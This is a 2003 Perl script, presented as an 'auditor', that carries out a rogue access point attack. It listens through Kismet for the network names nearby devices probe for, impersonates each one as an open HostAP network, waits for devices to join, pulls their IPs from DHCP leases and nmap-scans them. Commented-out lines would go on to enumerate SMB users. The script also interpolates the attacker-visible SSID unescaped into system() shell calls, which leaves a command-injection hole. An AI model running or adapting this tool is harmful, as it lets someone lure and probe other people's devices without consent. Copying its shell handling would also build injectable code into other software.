#!/usr/bin/perl -w
#
# kizap.pl
#
#####################################################################
#    m0j0.j0j0 KizAP Auditor
#       m0j0@foofus.net
#       04/03/2003
#
#####################################################################
#
#
use Net::Kismet qw(:manual);
use Getopt::Long;
use IPC::Shareable;
use FileHandle;

$VERSION = "0.0.4";
print "\nm0j0.j0j0 KizAP Auditor\n\n";

GetOptions (
	'no-hack'			=> sub { $hack = 0 },
	'no-auto'			=> sub { $auto = 0 },
	'help'				=> sub { $ShowUsage = 1; }
);
 
if ($ShowUsage) {
	print "KizAP V. $VERSION\n";
	print "Usage:\n";
	print " $0\n";
	print "   --no-hack						[Disable basic portscan/information gathering]\n";
	print "   --no-auto						[Pause after association and wait for user input]\n";
	exit(1);
} 
#elsif ($>) {
#	print "\n** ACCESS POINT CONFIGURATION REQUIRES ROOT PRIVLEDGES **\n\n";
#	exit(1);
#}

#####################################################################
#  MISC VARIABLES:
#
# $pidMap{} is keyed on the pid of the child process in charge
#   of managing that particular instance of the access point.
#	
$PROCCOUNT = -1; # MANAGEMENT THREAD
$p_read = 'PREAD00';
$p_write = 'PWRITE00';
$myPid = $$;

my @interface = ("wlan0");
my %clients;
# exclude list of SSIDs

$SIG{'CHLD'} = \&reaper;
#$SIG{'INT'} = \&doSummary;
#$SIG{'QUIT'} = \&doSummary;

$handle = tie %iwevents, 'IPC::Shareable', undef, { destroy => 1 };

#####################################################################
#  MAIN:
#

$k = new Net::Kismet('localhost', 2501);
$k->register('network', \&networkhandler, '*');
$k->timer_register(\&timer, 10);
KismetInit($k);

print "Starting probe scan...\n";
($p_manage, $pid_manage) = &addChild("MANAGE");
while (1) {
	if ( ($PROCCOUNT <= $#interface) && ($clientID = GetNextClient()) ) {
		print "CLIENT: $clientID\n";
		ADD: {
			($p_name, $pid) = &addChild($clientID);
			if ($pid == 0) {
				#sleep 1;
				#print STDERR "Redoing add\n";
				#redo ADD;
			} elsif ($pid == -1) {
				#print "PARENT [$$] failed $address.\n";
			} else {
				# Success
				#print "PARENT [$$] added child $status.\n";
				$pidMap{$pid}{'PIPE'} = $p_name;
			}
		} # ADD
	} else { 
		if (!defined KismetLoop($k)) {
			# ???? KismetLoop becomes undefined ???
			$k = new Net::Kismet('localhost', 2501);
			$k->register('network', \&networkhandler, '*');
			$k->timer_register(\&timer, 10);
			KismetInit($k);
		}
		KismetLoop($k); 
	}
}
exit(0);


#####################################################################
# Subroutines
#

sub networkhandler {
   #print "--> FOUND NET: $_[0]{'bssid'} : $_[0]{'ssid'}\n";
   if ($_[0]{'type'} ne '0') {
      if ( (!defined($clients{ $_[0]{'bssid'} })) || ($clients{ $_[0]{'bssid'} }{'ssid'} ne $_[0]{'ssid'}) ) { 
      	print "--> FOUND PROBE: $_[0]{'bssid'} : $_[0]{'ssid'} <--\n";
			$clients{ $_[0]{'bssid'} } = $_[0]; 
		}
   }
}

sub timer {
   #print "<<TIMER CALLBACK CALLED>>\n";
	# check for lame threads and kill if hung
	my $rin = "";
	vec ( $rin, fileno ("PREAD00"), 1 ) = 1;
	#while (1) {
		if ( $nfound = select($rout=$rin, undef, undef, 0) ) {
			$line = <PREAD00>;
			#print "TIMER: $line";
		}
	#}
}


# Return the next wireless network to impersonate
#
sub GetNextClient {
   # new SSID?
   # new clients for SSID?
   # which SSID to scan?
	foreach (keys %clients) {
		if ($clients{$_}{'ssid'} ne '<no ssid>') {
			if (!$clients{$_}{'checked'}) { $clients{$_}{'checked'} = 1; return $_; }
		}
	}
	return;
}


# Add a child, return the pid of the child process if successful, -1 if the
#   fork failed
#
sub addChild($) {
	my $clientID = $_[0];
	my $pid;
	pipe($p_read, $p_write) || die "Can't open a pair of pipes: $!";
	$p_read->autoflush(1);
	$p_write->autoflush(1);
	FORK: {
		if ($pid = fork()) {
			# ********* Parent Process **********
			$PROCCOUNT++;
			$pidMap{$pid} = $clientID;
			close($p_write);
			$hold = $p_read;
			$p_read++;
			$p_write++;
			return($hold, $pid);
			# ********* Parent Process **********
		} elsif (defined($pid)) {
			# ********** Child Process **********
 			close($p_read);
			if ($clientID ne "MANAGE") {
				print "Creating thread: $clientID -- $clients{$clientID}{'bssid'}\n";
				autoAP($clientID);
				#print $p_write $data;
			} else {
				print "Creating management thread...\n";
				manageAP();
			}
			close($p_write);
			print "Thread has completed.\n";
			exit(0);
			# ********** Child Process **********
		} elsif ($! =~ /no more process/i) {
			print "FORK ERROR!!!!\n";
			# recoverable fork error?
			sleep 5;
			redo FORK;
		} else {
			# can't fork
			return -1;
		}
	} # FORK
} # addChild


# handle the exit of a child process.
#
sub reaper() {
	my $pid = wait;
	# If this pid is not in the pid map, then we are harvesting one of
	#   our grandchildren, ignore it. 
	if (! defined ($pidMap{$pid})) { return; }

	$PROCCOUNT--;
	
	local($pipe) = $pidMap{$pid}{'PIPE'};
	@{ $res{ $pidMap{$pid} } } = <$pipe>;
	print "\n--> FINISHED: $pidMap{$pid} <--\n\n";
	close($pipe);

	delete $pidMap{$pid} if $pidMap{$pid}; # Keep track of only what is running.
} # reaper


sub autoAP {
	my $clientID = $_[0];
	print "Configuring HostAP...\n";
	print "\t SSID: $clients{$clientID}{'ssid'}\n";
	print "\t CHAN: $clients{$clientID}{'channel'}\n";
	
	if (!$clients{$clientID}{'channel'}) { $channel = 6; }
	else { $channel = $clients{$clientID}{'channel'}; }
	#system("iwconfig $interface[$PROCCOUNT - 1] essid $client{'ssid'} key off mode master channel $channel");
	print "iwconfig wlan0 essid \"$clients{$clientID}{'ssid'}\" key off mode master channel $channel\n";
	#system("iwconfig wlan0 essid $clients{$clientID}{'ssid'} key off mode master channel $channel");
	system("iwconfig wlan0 essid \"$clients{$clientID}{'ssid'}\" key off mode master");

	# has the client associated?
	print "Waiting for client(s)...";
	sleep(15);
	$handle->shlock();
	if ( defined($iwevents{"wlan0"}{$clients{$clientID}{'ssid'}}) ) { 
		@assoc = keys %{ $iwevents{"wlan0"}{$clients{$clientID}{'ssid'}} };
		print "SUCCESS.\nASSOCIATED CLIENTS:\n@assoc\n";
		$handle->shunlock();
	}
	else { 
		print "FAILED. NO CLIENTS ASSOCIATED\n"; 
		$handle->shunlock();
		return; 
	}

	# have any clients  grabbed an IP?
	print "Loading DHCP information...\n";
	sleep(10);
	my %DHCPleases;
	open(HAND, "/var/lib/dhcp/dhcpd.leases") || die("Failed to open dhcp.leases: $!");
	my @leaseFile = <HAND>;
	close(HAND);
	for ($i=0; $i<=$#leaseFile; $i++) {
		next unless ($leaseFile[$i] =~ /hardware ethernet/);
		my ($mac) = $leaseFile[$i] =~ /ethernet (.*);/;
		my ($ip) = $leaseFile[$i-3] =~ /^lease (.*) {/;
		$mac =~ tr/[a-z]/[A-Z]/;
		$DHCPleases{$mac} = $ip;
	}
	
	foreach (@assoc) {
		if ( defined($DHCPleases{$_}) ) {
			print "SCANNING HOST: $_ --> $DHCPleases{$_}\n";
			#sleep(30);
			# scan the client
			system("nmap -sS -O -p 22,23,80,139,445,3389,5800,5900 $DHCPleases{$_}");

			# is it windows....
			#system("nmblookup -A $clientIP");
			#system("smbgetserverinfo -i 192.168.0.14");
			#system("smbdumpusers -i 192.168.0.14");
		}
	}
}

sub manageAP {
	print $p_write "EXECUTING IWEVENT\n";
	open(HAND, "./iwevent 2>&1 |") || die("Unable to execute iwevent: $!");
	my $cur_ssid;
	my $rin = "";
	vec ( $rin, fileno (HAND), 1 ) = 1;
	while (1) {
	   if ( $nfound = select($rout=$rin, undef, undef, 0) ) {
			my $char = $line = "";
			while ($char ne "\n") {
				sysread(HAND, $char, 1);
				$line = $line . $char; 
			}
			#$line = <HAND>;
			print "MANAGEMENT: $line";
			print $p_write "$line";
			next if ($line =~ /Waiting for Wireless/);
			chomp $line;
			#@iwevent = split / +/, $line;
			@iwevent = $line =~ /^(\S+)\s+(\S+)\s+(.*)$/;
			#print "IWEVENT: 0-> $iwevent[0] 1-> $iwevent[1] 2-> $iwevent[2]\n";	
			# store iwevents in hash
			# iwevents --> interface --> SSID --> MAC --> LAST_REG/LAST_EXP --> TIMESTAMP
			$handle->shlock();
			if ($iwevent[2] =~ /^ESSID:/) { 
				($cur_ssid) = $iwevent[2] =~ /ESSID:"(.*)"/; 
				print "MANAGEMENT: ESSID: $cur_ssid\n";
			}
			elsif ($iwevent[2] =~ /^Registered node:/) { 
				my ($reg_node) = $iwevent[2] =~ /Registered node:(.*)/;
				$iwevents{"wlan0"}{$cur_ssid}{$reg_node}{"LAST_REG"} = $iwevent[0]; 
				print "MANAGEMENT: Registered node: $reg_node (ESSID: $cur_ssid)\n";
			}
			elsif ($iwevent[2] =~ /^Expired node:/) {
				my ($exp_node) = $iwevent[2] =~ /Expired node:(.*)/;
				#$iwevents{$iwevent[1]}{$cur_ssid}{$exp_node}{"LAST_EXP"} = $iwevent[0]; 
				$iwevents{"wlan0"}{$cur_ssid}{$exp_node}{"LAST_EXP"} = $iwevent[0]; 
				print "MANAGEMENT: Expired node: $exp_node (ESSID: $cur_ssid)\n";
			}
			$handle->shunlock();
		}
		#print "SLEEPING...";
		sleep(1);
	}
   close(HAND);
}
